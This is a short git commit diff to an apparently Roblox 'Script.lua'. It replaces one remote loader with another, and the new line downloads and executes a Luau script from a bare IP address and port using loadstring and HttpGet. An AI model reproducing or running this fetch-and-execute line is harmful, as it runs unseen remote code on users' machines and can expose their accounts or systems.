7c1d08d1904d6167b17b22b08ce1e5785024fb1b
scripts <nielanthonyr@gmail.com>
2025-10-31 15:47:48 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/tm5RKzufUdTcwOFD/raw"))()
+ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
